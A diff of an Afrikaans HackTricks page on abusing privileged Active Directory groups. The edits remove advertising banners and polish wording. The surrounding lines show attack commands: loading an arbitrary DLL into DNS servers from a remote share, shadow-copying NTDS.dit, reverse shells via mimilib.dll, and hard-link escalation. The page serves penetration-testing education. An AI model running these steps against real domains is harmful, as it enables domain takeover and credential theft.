@@ -2,14 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) om maklik te bou en **werkvloei** te **automate** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapstools.\
-Kry Toegang Vandag:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
-
-## Bekende groepe met administratiewe voorregte
+## Goed Bekende groepe met administratiewe voorregte
 
 - **Administrators**
 - **Domain Admins**
@@ -17,7 +10,7 @@ Kry Toegang Vandag:
 
 ## Rekening Operateurs
 
-Hierdie groep is bemagtig om rekeninge en groepe te skep wat nie administrateurs op die domein is nie. Boonop stel dit plaaslike aanmelding op die Domeinbeheerder (DC) in staat.
+Hierdie groep is gemagtig om rekeninge en groepe te skep wat nie administrateurs op die domein is nie. Boonop stel dit plaaslike aanmelding op die Domeinbeheerder (DC) in staat.
 
 Om die lede van hierdie groep te identifiseer, word die volgende opdrag uitgevoer:
 ```powershell
@@ -29,7 +22,7 @@ Die toevoeging van nuwe gebruikers is toegelaat, sowel as plaaslike aanmelding b
 
 Die **AdminSDHolder**-groep se Toegangsbeheerlis (ACL) is van kardinale belang aangesien dit toestemmings vir alle "beskermde groepe" binne Active Directory stel, insluitend hoë-privilege groepe. Hierdie meganisme verseker die sekuriteit van hierdie groepe deur ongeoorloofde wysigings te voorkom.
 
-'n Aanvaller kan hiervan gebruik maak deur die **AdminSDHolder**-groep se ACL te wysig, wat volle toestemmings aan 'n standaard gebruiker verleen. Dit sou daardie gebruiker effektief volle beheer oor alle beskermde groepe gee. As hierdie gebruiker se toestemmings gewysig of verwyder word, sal dit outomaties binne 'n uur hersteld word weens die stelsel se ontwerp.
+'n Aanvaller kan hiervan gebruik maak deur die **AdminSDHolder**-groep se ACL te wysig, wat volle toestemmings aan 'n standaard gebruiker gee. Dit sou daardie gebruiker effektief volle beheer oor alle beskermde groepe gee. As hierdie gebruiker se toestemmings gewysig of verwyder word, sal dit outomaties binne 'n uur hersteld word weens die stelsel se ontwerp.
 
 Opdragte om die lede te hersien en toestemmings te wysig sluit in:
 ```powershell
@@ -43,7 +36,7 @@ Vir meer besonderhede, besoek [ired.team](https://ired.team/offensive-security-e
 
 ## AD Herwinningsblik
 
-Lidmaatskap in hierdie groep stel jou in staat om geleesde aktiewe gidsobjekte te lees, wat sensitiewe inligting kan onthul:
+Lidmaatskap in hierdie groep stel in staat om geleesde verwyderde Active Directory-objekte, wat sensitiewe inligting kan onthul:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
@@ -61,7 +54,7 @@ Hierdie opdrag onthul dat `Server Operators` volle toegang het, wat die manipula
 
 ## Backup Operators
 
-Lidmaatskap in die `Backup Operators` groep bied toegang tot die `DC01` lêerstelsel as gevolg van die `SeBackup` en `SeRestore` privilige. Hierdie privilige stel vouer traversering, lysing, en lêer kopieer vermoëns in staat, selfs sonder eksplisiete toestemmings, deur die gebruik van die `FILE_FLAG_BACKUP_SEMANTICS` vlag. Dit is nodig om spesifieke skripte vir hierdie proses te gebruik.
+Lidmaatskap in die `Backup Operators` groep bied toegang tot die `DC01` lêerstelsel as gevolg van die `SeBackup` en `SeRestore` privilige. Hierdie privilige stel vouer traversering, lysing, en lêer kopieer vermoëns in staat, selfs sonder eksplisiete toestemmings, met die gebruik van die `FILE_FLAG_BACKUP_SEMANTICS` vlag. Dit is nodig om spesifieke skripte vir hierdie proses te gebruik.
 
 Om groepslede te lys, voer uit:
 ```powershell
@@ -92,7 +85,7 @@ Direkte toegang tot die Domeinbeheerder se lêerstelsel maak die diefstal van di
 
 #### Gebruik diskshadow.exe
 
-1. Skep 'n skaduweergawe van die `C` skyf:
+1. Skep 'n skaduwee-kopie van die `C` skyf:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -137,7 +130,7 @@ Vir 'n praktiese demonstrasie, sien [DEMO VIDEO WITH IPPSEC](https://www.youtube
 
 ## DnsAdmins
 
-Lede van die **DnsAdmins** groep kan hul voorregte benut om 'n arbitrêre DLL met SYSTEM voorregte op 'n DNS-bediener te laai, wat dikwels op Domein Beheerders gehos is. Hierdie vermoë stel 'n beduidende uitbuitingspotensiaal in staat.
+Lede van die **DnsAdmins** groep kan hul voorregte benut om 'n arbitrêre DLL met SYSTEM voorregte op 'n DNS-bediener te laai, wat dikwels op Domein Beheerders gehos te word. Hierdie vermoë bied 'n beduidende uitbuitingspotensiaal.
 
 Om lede van die DnsAdmins-groep te lys, gebruik:
 ```powershell
@@ -145,7 +138,7 @@ Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 ### Voer arbitrêre DLL uit
 
-Lede kan die DNS-bediener dwing om 'n arbitrêre DLL (of plaaslik of vanaf 'n afstanddeel) te laai met behulp van opdragte soos:
+Lede kan die DNS-bediener dwing om 'n arbitrêre DLL (of plaaslik of vanaf 'n afstandelike deel) te laai met behulp van opdragte soos:
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -176,12 +169,12 @@ Vir meer besonderhede oor hierdie aanvalsvector, verwys na ired.team.
 
 Dit is ook haalbaar om mimilib.dll te gebruik vir opdraguitvoering, dit te wysig om spesifieke opdragte of omgekeerde shells uit te voer. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) vir meer inligting.
 
-### WPAD Record for MitM
+### WPAD Record vir MitM
 
 DnsAdmins kan DNS-rekords manipuleer om Man-in-the-Middle (MitM) aanvalle uit te voer deur 'n WPAD-rekord te skep nadat die globale navraagbloklys gedeaktiveer is. Gereedskap soos Responder of Inveigh kan gebruik word om te spoof en netwerkverkeer te vang.
 
 ### Event Log Readers
-Lede kan toegang tot gebeurtenislogboekke hê, wat moontlik sensitiewe inligting soos platte wagwoorde of opdraguitvoeringsbesonderhede kan vind:
+Lede kan toegang tot gebeurtenislogboekke verkry, wat moontlik sensitiewe inligting soos platte wagwoorde of opdraguitvoeringsbesonderhede kan bevat:
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
@@ -189,16 +182,16 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 ```
 ## Exchange Windows Toestemmings
 
-Hierdie groep kan DACL's op die domeinobjek wysig, wat moontlik DCSync voorregte toeken. Tegnieke vir voorregverhoging wat hierdie groep benut, is in die Exchange-AD-Privesc GitHub repo gedetailleerd.
+Hierdie groep kan DACL's op die domeinobjek wysig, wat moontlik DCSync-toestemmings toeken. Tegnieke vir privilige-eskalasie wat hierdie groep benut, is in die Exchange-AD-Privesc GitHub-repo uiteengesit.
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Hyper-V Administrators
 
-Hyper-V Administrators het volle toegang tot Hyper-V, wat benut kan word om beheer oor gevirtualiseerde Domein Beheerders te verkry. Dit sluit die kloon van lewende DBs en die onttrekking van NTLM hashes uit die NTDS.dit-lêer in.
+Hyper-V Administrators het volle toegang tot Hyper-V, wat benut kan word om beheer oor gevirtualiseerde Domein Beheerders te verkry. Dit sluit die kloon van lewende DB's in en die onttrekking van NTLM hashes uit die NTDS.dit-lêer.
 
-### Exploit Voorbeeld
+### Exploitation Example
 
 Firefox se Mozilla Maintenance Service kan deur Hyper-V Administrators benut word om opdragte as SYSTEM uit te voer. Dit behels die skep van 'n harde skakel na 'n beskermde SYSTEM-lêer en dit vervang met 'n kwaadwillige uitvoerbare lêer:
 ```bash
@@ -210,13 +203,13 @@ Let wel: Hard link uitbuiting is in onlangse Windows-opdaterings gemitigeer.
 
 ## Organisasie Bestuur
 
-In omgewings waar **Microsoft Exchange** ontplooi is, hou 'n spesiale groep bekend as **Organisasie Bestuur** beduidende vermoëns. Hierdie groep het die voorreg om **toegang te verkry tot die posbusse van alle domein gebruikers** en handhaaf **volledige beheer oor die 'Microsoft Exchange Security Groups'** Organisatoriese Eenheid (OU). Hierdie beheer sluit die **`Exchange Windows Permissions`** groep in, wat vir voorreg eskalasie benut kan word.
+In omgewings waar **Microsoft Exchange** ontplooi is, hou 'n spesiale groep bekend as **Organisasie Bestuur** beduidende vermoëns. Hierdie groep het die voorreg om **toegang te verkry tot die posbusse van alle domein gebruikers** en handhaaf **volledige beheer oor die 'Microsoft Exchange Security Groups'** Organisatoriese Eenheid (OU). Hierdie beheer sluit die **`Exchange Windows Permissions`** groep in, wat uitgebuit kan word vir voorreg eskalasie.
 
 ### Voorreg Uitbuiting en Opdragte
 
 #### Druk Operateurs
 
-Lede van die **Druk Operateurs** groep is toegerus met verskeie voorregte, insluitend die **`SeLoadDriverPrivilege`**, wat hulle toelaat om **lokaal aan te meld by 'n Domein Beheerder**, dit af te sluit, en drukkers te bestuur. Om hierdie voorregte te benut, veral as **`SeLoadDriverPrivilege`** nie sigbaar is onder 'n nie-verhoogde konteks nie, is dit nodig om die Gebruiker Rekening Beheer (UAC) te omseil.
+Lede van die **Druk Operateurs** groep is toegerus met verskeie voorregte, insluitend die **`SeLoadDriverPrivilege`**, wat hulle toelaat om **lokaal aan te meld by 'n Domein Beheerder**, dit af te sluit, en drukkers te bestuur. Om hierdie voorregte uit te buit, veral as **`SeLoadDriverPrivilege`** nie sigbaar is onder 'n nie-verhoogde konteks nie, is dit nodig om die Gebruiker Rekening Beheer (UAC) te omseil.
 
 Om die lede van hierdie groep te lys, word die volgende PowerShell-opdrag gebruik:
 ```powershell
@@ -265,11 +258,5 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 - [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 - [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskapstools aangedryf word.\
-Kry Toegang Vandag:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
